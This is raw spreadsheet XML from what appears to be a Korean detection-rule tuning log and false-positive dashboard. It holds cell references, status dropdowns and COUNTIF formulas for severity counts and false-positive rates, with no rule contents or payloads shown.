      <c r="G37" s="49" t="s">
        <v>319</v>
      </c>
      <c r="H37" s="51" t="s">
        <v>320</v>
      </c>
      <c r="I37" s="49" t="s">
        <v>315</v>
      </c>
      <c r="J37" s="47">
        <v>46178.0</v>
      </c>
      <c r="K37" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L37" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="38" ht="15.75" customHeight="1">
      <c r="A38" s="44" t="s">
        <v>321</v>
      </c>
      <c r="B38" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C38" s="49">
        <v>1001010.0</v>
      </c>
      <c r="D38" s="49" t="s">
        <v>322</v>
      </c>
      <c r="E38" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F38" s="49" t="s">
        <v>323</v>
      </c>
      <c r="G38" s="49" t="s">
        <v>324</v>
      </c>
      <c r="H38" s="51" t="s">
        <v>325</v>
      </c>
      <c r="I38" s="49" t="s">
        <v>326</v>
      </c>
      <c r="J38" s="47">
        <v>46178.0</v>
      </c>
      <c r="K38" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L38" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="39" ht="15.75" customHeight="1">
      <c r="A39" s="48" t="s">
        <v>327</v>
      </c>
      <c r="B39" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C39" s="49">
        <v>1001011.0</v>
      </c>
      <c r="D39" s="49" t="s">
        <v>328</v>
      </c>
      <c r="E39" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F39" s="49" t="s">
        <v>329</v>
      </c>
      <c r="G39" s="49" t="s">
        <v>330</v>
      </c>
      <c r="H39" s="51" t="s">
        <v>331</v>
      </c>
      <c r="I39" s="49" t="s">
        <v>326</v>
      </c>
      <c r="J39" s="47">
        <v>46178.0</v>
      </c>
      <c r="K39" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L39" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="40" ht="15.75" customHeight="1">
      <c r="A40" s="44" t="s">
        <v>332</v>
      </c>
      <c r="B40" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C40" s="49">
        <v>1001012.0</v>
      </c>
      <c r="D40" s="49" t="s">
        <v>333</v>
      </c>
      <c r="E40" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F40" s="49" t="s">
        <v>334</v>
      </c>
      <c r="G40" s="49" t="s">
        <v>335</v>
      </c>
      <c r="H40" s="51" t="s">
        <v>336</v>
      </c>
      <c r="I40" s="49" t="s">
        <v>337</v>
      </c>
      <c r="J40" s="47">
        <v>46178.0</v>
      </c>
      <c r="K40" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L40" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="41" ht="15.75" customHeight="1">
      <c r="A41" s="48" t="s">
        <v>338</v>
      </c>
      <c r="B41" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C41" s="49">
        <v>1001013.0</v>
      </c>
      <c r="D41" s="49" t="s">
        <v>339</v>
      </c>
      <c r="E41" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F41" s="49" t="s">
        <v>340</v>
      </c>
      <c r="G41" s="49" t="s">
        <v>341</v>
      </c>
      <c r="H41" s="51" t="s">
        <v>342</v>
      </c>
      <c r="I41" s="49" t="s">
        <v>337</v>
      </c>
      <c r="J41" s="47">
        <v>46178.0</v>
      </c>
      <c r="K41" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L41" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="42" ht="15.75" customHeight="1">
      <c r="A42" s="44" t="s">
        <v>343</v>
      </c>
      <c r="B42" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C42" s="49">
        <v>1002001.0</v>
      </c>
      <c r="D42" s="49" t="s">
        <v>344</v>
      </c>
      <c r="E42" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F42" s="49" t="s">
        <v>345</v>
      </c>
      <c r="G42" s="49" t="s">
        <v>346</v>
      </c>
      <c r="H42" s="51" t="s">
        <v>347</v>
      </c>
      <c r="I42" s="49"/>
      <c r="J42" s="47">
        <v>46178.0</v>
      </c>
      <c r="K42" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L42" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="43" ht="15.75" customHeight="1">
      <c r="A43" s="48" t="s">
        <v>348</v>
      </c>
      <c r="B43" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C43" s="49">
        <v>1002002.0</v>
      </c>
      <c r="D43" s="49" t="s">
        <v>349</v>
      </c>
      <c r="E43" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F43" s="49" t="s">
        <v>350</v>
      </c>
      <c r="G43" s="49" t="s">
        <v>351</v>
      </c>
      <c r="H43" s="51" t="s">
        <v>352</v>
      </c>
      <c r="I43" s="49" t="s">
        <v>353</v>
      </c>
      <c r="J43" s="47">
        <v>46178.0</v>
      </c>
      <c r="K43" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L43" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="44" ht="15.75" customHeight="1">
      <c r="A44" s="44" t="s">
        <v>354</v>
      </c>
      <c r="B44" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C44" s="49">
        <v>1002003.0</v>
      </c>
      <c r="D44" s="49" t="s">
        <v>355</v>
      </c>
      <c r="E44" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F44" s="49" t="s">
        <v>356</v>
      </c>
      <c r="G44" s="49" t="s">
        <v>357</v>
      </c>
      <c r="H44" s="51" t="s">
        <v>358</v>
      </c>
      <c r="I44" s="49" t="s">
        <v>359</v>
      </c>
      <c r="J44" s="47">
        <v>46178.0</v>
      </c>
      <c r="K44" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L44" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="45" ht="15.75" customHeight="1">
      <c r="A45" s="48" t="s">
        <v>360</v>
      </c>
      <c r="B45" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C45" s="49">
        <v>1002004.0</v>
      </c>
      <c r="D45" s="49" t="s">
        <v>361</v>
      </c>
      <c r="E45" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F45" s="49" t="s">
        <v>362</v>
      </c>
      <c r="G45" s="49" t="s">
        <v>363</v>
      </c>
      <c r="H45" s="51" t="s">
        <v>364</v>
      </c>
      <c r="I45" s="49" t="s">
        <v>365</v>
      </c>
      <c r="J45" s="47">
        <v>46178.0</v>
      </c>
      <c r="K45" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L45" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="46" ht="15.75" customHeight="1">
      <c r="A46" s="44" t="s">
        <v>366</v>
      </c>
      <c r="B46" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C46" s="49">
        <v>1002005.0</v>
      </c>
      <c r="D46" s="49" t="s">
        <v>367</v>
      </c>
      <c r="E46" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F46" s="49" t="s">
        <v>368</v>
      </c>
      <c r="G46" s="49" t="s">
        <v>369</v>
      </c>
      <c r="H46" s="51" t="s">
        <v>370</v>
      </c>
      <c r="I46" s="49" t="s">
        <v>371</v>
      </c>
      <c r="J46" s="47">
        <v>46178.0</v>
      </c>
      <c r="K46" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L46" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="47" ht="15.75" customHeight="1">
      <c r="A47" s="48" t="s">
        <v>372</v>
      </c>
      <c r="B47" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C47" s="49">
        <v>1002006.0</v>
      </c>
      <c r="D47" s="49" t="s">
        <v>373</v>
      </c>
      <c r="E47" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F47" s="49" t="s">
        <v>374</v>
      </c>
      <c r="G47" s="49" t="s">
        <v>375</v>
      </c>
      <c r="H47" s="51" t="s">
        <v>376</v>
      </c>
      <c r="I47" s="49" t="s">
        <v>377</v>
      </c>
      <c r="J47" s="47">
        <v>46178.0</v>
      </c>
      <c r="K47" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L47" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="48" ht="15.75" customHeight="1">
      <c r="A48" s="44" t="s">
        <v>378</v>
      </c>
      <c r="B48" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C48" s="49">
        <v>1003001.0</v>
      </c>
      <c r="D48" s="49" t="s">
        <v>379</v>
      </c>
      <c r="E48" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F48" s="49" t="s">
        <v>380</v>
      </c>
      <c r="G48" s="49" t="s">
        <v>381</v>
      </c>
      <c r="H48" s="51" t="s">
        <v>382</v>
      </c>
      <c r="I48" s="49" t="s">
        <v>383</v>
      </c>
      <c r="J48" s="47">
        <v>46178.0</v>
      </c>
      <c r="K48" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L48" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="49" ht="15.75" customHeight="1">
      <c r="A49" s="48" t="s">
        <v>384</v>
      </c>
      <c r="B49" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C49" s="49">
        <v>1003002.0</v>
      </c>
      <c r="D49" s="49" t="s">
        <v>385</v>
      </c>
      <c r="E49" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F49" s="49" t="s">
        <v>386</v>
      </c>
      <c r="G49" s="49" t="s">
        <v>387</v>
      </c>
      <c r="H49" s="51" t="s">
        <v>388</v>
      </c>
      <c r="I49" s="49" t="s">
        <v>389</v>
      </c>
      <c r="J49" s="47">
        <v>46178.0</v>
      </c>
      <c r="K49" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L49" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="50" ht="15.75" customHeight="1">
      <c r="A50" s="44" t="s">
        <v>390</v>
      </c>
      <c r="B50" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C50" s="49">
        <v>1003003.0</v>
      </c>
      <c r="D50" s="49" t="s">
        <v>391</v>
      </c>
      <c r="E50" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F50" s="49" t="s">
        <v>392</v>
      </c>
      <c r="G50" s="49" t="s">
        <v>393</v>
      </c>
      <c r="H50" s="51" t="s">
        <v>394</v>
      </c>
      <c r="I50" s="49" t="s">
        <v>395</v>
      </c>
      <c r="J50" s="47">
        <v>46178.0</v>
      </c>
      <c r="K50" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L50" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="51" ht="15.75" customHeight="1">
      <c r="A51" s="48" t="s">
        <v>396</v>
      </c>
      <c r="B51" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C51" s="49">
        <v>1003004.0</v>
      </c>
      <c r="D51" s="49" t="s">
        <v>397</v>
      </c>
      <c r="E51" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F51" s="49" t="s">
        <v>398</v>
      </c>
      <c r="G51" s="49" t="s">
        <v>399</v>
      </c>
      <c r="H51" s="51" t="s">
        <v>400</v>
      </c>
      <c r="I51" s="49" t="s">
        <v>401</v>
      </c>
      <c r="J51" s="47">
        <v>46178.0</v>
      </c>
      <c r="K51" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L51" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="52" ht="15.75" customHeight="1">
      <c r="A52" s="44" t="s">
        <v>402</v>
      </c>
      <c r="B52" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C52" s="49">
        <v>1003005.0</v>
      </c>
      <c r="D52" s="49" t="s">
        <v>403</v>
      </c>
      <c r="E52" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F52" s="49" t="s">
        <v>404</v>
      </c>
      <c r="G52" s="49" t="s">
        <v>405</v>
      </c>
      <c r="H52" s="51" t="s">
        <v>406</v>
      </c>
      <c r="I52" s="49" t="s">
        <v>407</v>
      </c>
      <c r="J52" s="47">
        <v>46178.0</v>
      </c>
      <c r="K52" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L52" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="53" ht="15.75" customHeight="1">
      <c r="A53" s="48" t="s">
        <v>408</v>
      </c>
      <c r="B53" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C53" s="49">
        <v>1003006.0</v>
      </c>
      <c r="D53" s="49" t="s">
        <v>409</v>
      </c>
      <c r="E53" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F53" s="49" t="s">
        <v>410</v>
      </c>
      <c r="G53" s="49" t="s">
        <v>411</v>
      </c>
      <c r="H53" s="51" t="s">
        <v>412</v>
      </c>
      <c r="I53" s="49" t="s">
        <v>413</v>
      </c>
      <c r="J53" s="47">
        <v>46178.0</v>
      </c>
      <c r="K53" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L53" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="54" ht="15.75" customHeight="1">
      <c r="A54" s="44" t="s">
        <v>414</v>
      </c>
      <c r="B54" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C54" s="49">
        <v>1003005.0</v>
      </c>
      <c r="D54" s="49" t="s">
        <v>415</v>
      </c>
      <c r="E54" s="50" t="s">
        <v>416</v>
      </c>
      <c r="F54" s="49" t="s">
        <v>417</v>
      </c>
      <c r="G54" s="49" t="s">
        <v>418</v>
      </c>
      <c r="H54" s="51" t="s">
        <v>419</v>
      </c>
      <c r="I54" s="49" t="s">
        <v>420</v>
      </c>
      <c r="J54" s="47">
        <v>46181.0</v>
      </c>
      <c r="K54" s="49" t="s">
        <v>130</v>
      </c>
      <c r="L54" s="49" t="s">
        <v>421</v>
      </c>
    </row>
    <row r="55" ht="15.75" customHeight="1">
      <c r="A55" s="48" t="s">
        <v>422</v>
      </c>
      <c r="B55" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C55" s="49">
        <v>1001004.0</v>
      </c>
      <c r="D55" s="49" t="s">
        <v>423</v>
      </c>
      <c r="E55" s="50" t="s">
        <v>416</v>
      </c>
      <c r="F55" s="49" t="s">
        <v>424</v>
      </c>
      <c r="G55" s="49" t="s">
        <v>425</v>
      </c>
      <c r="H55" s="51" t="s">
        <v>426</v>
      </c>
      <c r="I55" s="49" t="s">
        <v>427</v>
      </c>
      <c r="J55" s="47">
        <v>46181.0</v>
      </c>
      <c r="K55" s="53" t="s">
        <v>130</v>
      </c>
      <c r="L55" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="56" ht="15.75" customHeight="1">
      <c r="A56" s="44" t="s">
        <v>428</v>
      </c>
      <c r="B56" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C56" s="49">
        <v>1001005.0</v>
      </c>
      <c r="D56" s="49" t="s">
        <v>429</v>
      </c>
      <c r="E56" s="50" t="s">
        <v>416</v>
      </c>
      <c r="F56" s="49" t="s">
        <v>424</v>
      </c>
      <c r="G56" s="49" t="s">
        <v>425</v>
      </c>
      <c r="H56" s="51" t="s">
        <v>426</v>
      </c>
      <c r="I56" s="49" t="s">
        <v>427</v>
      </c>
      <c r="J56" s="47">
        <v>46181.0</v>
      </c>
      <c r="K56" s="53" t="s">
        <v>130</v>
      </c>
      <c r="L56" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="57" ht="15.75" customHeight="1">
      <c r="A57" s="48" t="s">
        <v>430</v>
      </c>
      <c r="B57" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C57" s="49">
        <v>1001008.0</v>
      </c>
      <c r="D57" s="49" t="s">
        <v>431</v>
      </c>
      <c r="E57" s="50" t="s">
        <v>416</v>
      </c>
      <c r="F57" s="49" t="s">
        <v>432</v>
      </c>
      <c r="G57" s="49" t="s">
        <v>433</v>
      </c>
      <c r="H57" s="51" t="s">
        <v>434</v>
      </c>
      <c r="I57" s="49" t="s">
        <v>427</v>
      </c>
      <c r="J57" s="47">
        <v>46181.0</v>
      </c>
      <c r="K57" s="53" t="s">
        <v>130</v>
      </c>
      <c r="L57" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="58" ht="15.75" customHeight="1">
      <c r="A58" s="44" t="s">
        <v>435</v>
      </c>
      <c r="B58" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C58" s="49">
        <v>1001009.0</v>
      </c>
      <c r="D58" s="49" t="s">
        <v>436</v>
      </c>
      <c r="E58" s="50" t="s">
        <v>416</v>
      </c>
      <c r="F58" s="49" t="s">
        <v>432</v>
      </c>
      <c r="G58" s="49" t="s">
        <v>433</v>
      </c>
      <c r="H58" s="51" t="s">
        <v>434</v>
      </c>
      <c r="I58" s="49" t="s">
        <v>427</v>
      </c>
      <c r="J58" s="47">
        <v>46181.0</v>
      </c>
      <c r="K58" s="53" t="s">
        <v>130</v>
      </c>
      <c r="L58" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="59" ht="15.75" customHeight="1">
      <c r="A59" s="44"/>
      <c r="B59" s="49"/>
      <c r="C59" s="49"/>
      <c r="D59" s="49"/>
      <c r="E59" s="50"/>
      <c r="F59" s="49"/>
      <c r="G59" s="49"/>
      <c r="H59" s="51"/>
      <c r="I59" s="49"/>
      <c r="J59" s="47"/>
      <c r="K59" s="44"/>
      <c r="L59" s="52"/>
    </row>
    <row r="60" ht="15.75" customHeight="1">
      <c r="A60" s="48"/>
      <c r="B60" s="49"/>
      <c r="C60" s="49"/>
      <c r="D60" s="49"/>
      <c r="E60" s="50"/>
      <c r="F60" s="49"/>
      <c r="G60" s="49"/>
      <c r="H60" s="51"/>
      <c r="I60" s="49"/>
      <c r="J60" s="47"/>
      <c r="K60" s="44"/>
      <c r="L60" s="52"/>
    </row>
    <row r="61" ht="15.75" customHeight="1">
      <c r="A61" s="44"/>
      <c r="B61" s="49"/>
      <c r="C61" s="49"/>
      <c r="D61" s="49"/>
      <c r="E61" s="50"/>
      <c r="F61" s="49"/>
      <c r="G61" s="49"/>
      <c r="H61" s="51"/>
      <c r="I61" s="49"/>
      <c r="J61" s="47"/>
      <c r="K61" s="44"/>
      <c r="L61" s="52"/>
    </row>
    <row r="62" ht="15.75" customHeight="1">
      <c r="A62" s="48"/>
      <c r="B62" s="49"/>
      <c r="C62" s="49"/>
      <c r="D62" s="49"/>
      <c r="E62" s="50"/>
      <c r="F62" s="49"/>
      <c r="G62" s="49"/>
      <c r="H62" s="51"/>
      <c r="I62" s="49"/>
      <c r="J62" s="47"/>
      <c r="K62" s="44"/>
      <c r="L62" s="52"/>
    </row>
    <row r="63" ht="15.75" customHeight="1">
      <c r="A63" s="44"/>
      <c r="B63" s="49"/>
      <c r="C63" s="49"/>
      <c r="D63" s="49"/>
      <c r="E63" s="50"/>
      <c r="F63" s="49"/>
      <c r="G63" s="49"/>
      <c r="H63" s="51"/>
      <c r="I63" s="49"/>
      <c r="J63" s="47"/>
      <c r="K63" s="44"/>
      <c r="L63" s="52"/>
    </row>
    <row r="64" ht="15.75" customHeight="1">
      <c r="A64" s="48"/>
      <c r="B64" s="49"/>
      <c r="C64" s="49"/>
      <c r="D64" s="49"/>
      <c r="E64" s="50"/>
      <c r="F64" s="49"/>
      <c r="G64" s="49"/>
      <c r="H64" s="51"/>
      <c r="I64" s="49"/>
      <c r="J64" s="47"/>
      <c r="K64" s="44"/>
      <c r="L64" s="52"/>
    </row>
    <row r="65" ht="15.75" customHeight="1">
      <c r="A65" s="44"/>
      <c r="B65" s="49"/>
      <c r="C65" s="49"/>
      <c r="D65" s="49"/>
      <c r="E65" s="50"/>
      <c r="F65" s="49"/>
      <c r="G65" s="49"/>
      <c r="H65" s="51"/>
      <c r="I65" s="49"/>
      <c r="J65" s="47"/>
      <c r="K65" s="44"/>
      <c r="L65" s="52"/>
    </row>
    <row r="66" ht="15.75" customHeight="1">
      <c r="A66" s="48"/>
      <c r="B66" s="49"/>
      <c r="C66" s="49"/>
      <c r="D66" s="49"/>
      <c r="E66" s="50"/>
      <c r="F66" s="49"/>
      <c r="G66" s="49"/>
      <c r="H66" s="51"/>
      <c r="I66" s="49"/>
      <c r="J66" s="47"/>
      <c r="K66" s="44"/>
      <c r="L66" s="52"/>
    </row>
    <row r="67" ht="15.75" customHeight="1">
      <c r="A67" s="44"/>
      <c r="B67" s="49"/>
      <c r="C67" s="49"/>
      <c r="D67" s="49"/>
      <c r="E67" s="50"/>
      <c r="F67" s="49"/>
      <c r="G67" s="49"/>
      <c r="H67" s="51"/>
      <c r="I67" s="49"/>
      <c r="J67" s="47"/>
      <c r="K67" s="44"/>
      <c r="L67" s="52"/>
    </row>
    <row r="68" ht="15.75" customHeight="1">
      <c r="A68" s="48"/>
      <c r="B68" s="49"/>
      <c r="C68" s="49"/>
      <c r="D68" s="49"/>
      <c r="E68" s="50"/>
      <c r="F68" s="49"/>
      <c r="G68" s="49"/>
      <c r="H68" s="51"/>
      <c r="I68" s="49"/>
      <c r="J68" s="47"/>
      <c r="K68" s="44"/>
      <c r="L68" s="52"/>
    </row>
    <row r="69" ht="15.75" customHeight="1">
      <c r="A69" s="44"/>
      <c r="B69" s="49"/>
      <c r="C69" s="49"/>
      <c r="D69" s="49"/>
      <c r="E69" s="50"/>
      <c r="F69" s="49"/>
      <c r="G69" s="49"/>
      <c r="H69" s="51"/>
      <c r="I69" s="49"/>
      <c r="J69" s="47"/>
      <c r="K69" s="44"/>
      <c r="L69" s="52"/>
    </row>
    <row r="70" ht="15.75" customHeight="1">
      <c r="A70" s="48"/>
      <c r="B70" s="49"/>
      <c r="C70" s="49"/>
      <c r="D70" s="49"/>
      <c r="E70" s="50"/>
      <c r="F70" s="49"/>
      <c r="G70" s="49"/>
      <c r="H70" s="51"/>
      <c r="I70" s="49"/>
      <c r="J70" s="47"/>
      <c r="K70" s="44"/>
      <c r="L70" s="52"/>
    </row>
    <row r="71" ht="15.75" customHeight="1">
      <c r="A71" s="44"/>
      <c r="B71" s="49"/>
      <c r="C71" s="49"/>
      <c r="D71" s="49"/>
      <c r="E71" s="50"/>
      <c r="F71" s="49"/>
      <c r="G71" s="49"/>
      <c r="H71" s="51"/>
      <c r="I71" s="49"/>
      <c r="J71" s="47"/>
      <c r="K71" s="44"/>
      <c r="L71" s="52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L$58"/>
  <mergeCells count="1">
    <mergeCell ref="A1:L1"/>
  </mergeCells>
  <conditionalFormatting sqref="K4:K71">
    <cfRule type="cellIs" dxfId="0" priority="1" operator="equal">
      <formula>"검증완료"</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="K4:K71">
    <cfRule type="cellIs" dxfId="1" priority="2" operator="equal">
      <formula>"대기"</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations>
    <dataValidation type="list" allowBlank="1" sqref="K4:K71">
      <formula1>"대기,적용,검증중,검증완료,보류"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" sqref="E4:E61 E63:E65 E67:E69 E71">
      <formula1>"오탐,미탐,튜닝개선"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3" width="14.0"/>
    <col customWidth="1" min="4" max="6" width="8.71"/>
    <col customWidth="1" min="7" max="7" width="24.14"/>
    <col customWidth="1" min="8" max="8" width="14.71"/>
    <col customWidth="1" min="9" max="11" width="8.71"/>
    <col customWidth="1" min="12" max="12" width="21.71"/>
    <col customWidth="1" min="13" max="26" width="8.71"/>
  </cols>
  <sheetData>
    <row r="2">
      <c r="B2" s="54" t="s">
        <v>437</v>
      </c>
      <c r="G2" s="55" t="s">
        <v>438</v>
      </c>
      <c r="L2" s="55" t="s">
        <v>439</v>
      </c>
    </row>
    <row r="3">
      <c r="B3" s="56" t="s">
        <v>440</v>
      </c>
    </row>
    <row r="5">
      <c r="B5" s="41" t="s">
        <v>441</v>
      </c>
      <c r="C5" s="41" t="s">
        <v>442</v>
      </c>
      <c r="G5" s="41" t="s">
        <v>441</v>
      </c>
      <c r="H5" s="41" t="s">
        <v>442</v>
      </c>
      <c r="L5" s="41" t="s">
        <v>441</v>
      </c>
      <c r="M5" s="41" t="s">
        <v>442</v>
      </c>
    </row>
    <row r="6">
      <c r="B6" s="57" t="s">
        <v>443</v>
      </c>
      <c r="C6" s="58">
        <v>14.0</v>
      </c>
      <c r="G6" s="57" t="s">
        <v>443</v>
      </c>
      <c r="H6" s="58">
        <v>14.0</v>
      </c>
      <c r="L6" s="57" t="s">
        <v>443</v>
      </c>
      <c r="M6" s="58">
        <v>14.0</v>
      </c>
    </row>
    <row r="7">
      <c r="B7" s="59" t="s">
        <v>444</v>
      </c>
      <c r="C7" s="58">
        <v>7.0</v>
      </c>
      <c r="G7" s="59" t="s">
        <v>445</v>
      </c>
      <c r="H7" s="58">
        <v>14.0</v>
      </c>
      <c r="L7" s="59" t="s">
        <v>446</v>
      </c>
      <c r="M7" s="58">
        <v>14.0</v>
      </c>
    </row>
    <row r="8">
      <c r="B8" s="59" t="s">
        <v>447</v>
      </c>
      <c r="C8" s="58">
        <v>0.0</v>
      </c>
      <c r="G8" s="59" t="s">
        <v>448</v>
      </c>
      <c r="H8" s="58">
        <v>0.0</v>
      </c>
      <c r="L8" s="59" t="s">
        <v>449</v>
      </c>
      <c r="M8" s="58">
        <v>0.0</v>
      </c>
    </row>
    <row r="9">
      <c r="B9" s="59" t="s">
        <v>450</v>
      </c>
      <c r="C9" s="58">
        <v>7.0</v>
      </c>
      <c r="G9" s="59" t="s">
        <v>450</v>
      </c>
      <c r="H9" s="58">
        <v>0.0</v>
      </c>
      <c r="L9" s="59" t="s">
        <v>450</v>
      </c>
      <c r="M9" s="58">
        <v>0.0</v>
      </c>
    </row>
    <row r="10">
      <c r="B10" s="60" t="s">
        <v>451</v>
      </c>
      <c r="C10" s="61">
        <f>(C8/(C7+C8))</f>
        <v>0</v>
      </c>
      <c r="G10" s="60" t="s">
        <v>452</v>
      </c>
      <c r="H10" s="61">
        <f>IFERROR(COUNTIF('오탐기록대장'!S4:S30,"오탐")/(COUNTIF('오탐기록대장'!S4:S30,"정탐")+COUNTIF('오탐기록대장'!S4:S30,"오탐")),0)</f>
        <v>0</v>
      </c>
      <c r="L10" s="60" t="s">
        <v>453</v>
      </c>
      <c r="M10" s="61">
        <f>IFERROR(COUNTIF('오탐기록대장'!X4:X30,"오탐")/(COUNTIF('오탐기록대장'!X4:X30,"정탐")+COUNTIF('오탐기록대장'!X4:X30,"오탐")),0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="12">
      <c r="B12" s="41" t="s">
        <v>454</v>
      </c>
      <c r="C12" s="41" t="s">
        <v>455</v>
      </c>
      <c r="G12" s="41" t="s">
        <v>454</v>
      </c>
      <c r="H12" s="41" t="s">
        <v>455</v>
      </c>
      <c r="L12" s="41" t="s">
        <v>454</v>
      </c>
      <c r="M12" s="41" t="s">
        <v>455</v>
      </c>
    </row>
    <row r="13">
      <c r="B13" s="62" t="s">
        <v>55</v>
      </c>
      <c r="C13" s="48">
        <f>COUNTIF('오탐기록대장'!F4:F30,"HIGH")</f>
        <v>10</v>
      </c>
      <c r="G13" s="62" t="s">
        <v>55</v>
      </c>
      <c r="H13" s="48">
        <f>COUNTIF('오탐기록대장'!K4:K30,"HIGH")</f>
        <v>0</v>
      </c>
      <c r="L13" s="62" t="s">
        <v>55</v>
      </c>
      <c r="M13" s="48">
        <f>COUNTIF('오탐기록대장'!P4:P30,"HIGH")</f>
        <v>0</v>
      </c>
    </row>
    <row r="14">
      <c r="B14" s="62" t="s">
        <v>69</v>
      </c>
      <c r="C14" s="48">
        <f>COUNTIF('오탐기록대장'!F4:F30,"MEDIUM")</f>
        <v>13</v>
      </c>
      <c r="G14" s="62" t="s">
        <v>69</v>
      </c>
      <c r="H14" s="48">
        <f>COUNTIF('오탐기록대장'!K4:K30,"MEDIUM")</f>
        <v>0</v>
      </c>
      <c r="L14" s="62" t="s">
        <v>69</v>
      </c>
      <c r="M14" s="48">
        <f>COUNTIF('오탐기록대장'!P4:P30,"MEDIUM")</f>
        <v>0</v>
      </c>
    </row>
    <row r="15">
      <c r="B15" s="62" t="s">
        <v>456</v>
      </c>
      <c r="C15" s="48">
        <f>COUNTIF('오탐기록대장'!F4:F30,"LOW")</f>
        <v>0</v>
      </c>
      <c r="G15" s="62" t="s">
        <v>456</v>
      </c>
      <c r="H15" s="48">
        <f>COUNTIF('오탐기록대장'!K4:K30,"LOW")</f>
        <v>0</v>
      </c>
      <c r="L15" s="62" t="s">
        <v>456</v>
      </c>
      <c r="M15" s="48">
        <f>COUNTIF('오탐기록대장'!P4:P30,"LOW")</f>
        <v>0</v>
      </c>
    </row>
    <row r="16">
      <c r="B16" s="62" t="s">
        <v>457</v>
      </c>
      <c r="C16" s="48">
        <f>COUNTIF('오탐기록대장'!F4:F30,"INFO")</f>
        <v>0</v>
      </c>
      <c r="G16" s="62" t="s">
        <v>457</v>
      </c>
      <c r="H16" s="48">
        <f>COUNTIF('오탐기록대장'!K4:K30,"INFO")</f>
        <v>0</v>
      </c>
      <c r="L16" s="62" t="s">
        <v>457</v>
      </c>
      <c r="M16" s="48">
        <f>COUNTIF('오탐기록대장'!P4:P30,"INFO")</f>
        <v>0</v>
      </c>
    </row>
    <row r="18">
      <c r="B18" s="41" t="s">
        <v>458</v>
      </c>
      <c r="C18" s="41" t="s">
        <v>455</v>
      </c>
    </row>
    <row r="19">
      <c r="B19" s="59" t="s">
        <v>459</v>
      </c>
      <c r="C19" s="48">
        <f>COUNTIF('룰튜닝관리'!K4:K24,"대기")</f>
        <v>0</v>
      </c>
    </row>
    <row r="20">
      <c r="B20" s="59" t="s">
        <v>460</v>
      </c>
      <c r="C20" s="48">
        <f>COUNTIF('룰튜닝관리'!K4:K24,"적용")</f>
        <v>0</v>
      </c>
    </row>
    <row r="21" ht="15.75" customHeight="1">
